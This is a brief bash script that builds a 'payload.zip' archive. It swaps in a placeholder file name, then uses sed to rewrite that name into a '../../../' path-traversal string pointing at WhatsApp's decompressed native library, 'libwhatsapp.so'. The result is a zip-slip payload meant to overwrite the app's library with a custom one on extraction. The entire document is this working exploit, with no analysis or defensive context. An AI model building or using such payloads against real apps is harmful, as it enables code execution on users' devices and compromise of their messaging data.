#!/bin/bash

#
# We need to have our custom library extracted here:
#
# ../../../files/decompressed/libs.spk.zst/libwhatsapp.so
#

mv libwhatsapp.so AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.so
zip - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.so | \
    LC_ALL=C sed s/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.so/..\\/..\\/..\\/files\\/decompressed\\/libs.spk.zst\\/libwhatsapp.so/g > payload.zip
mv AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.so libwhatsapp.so

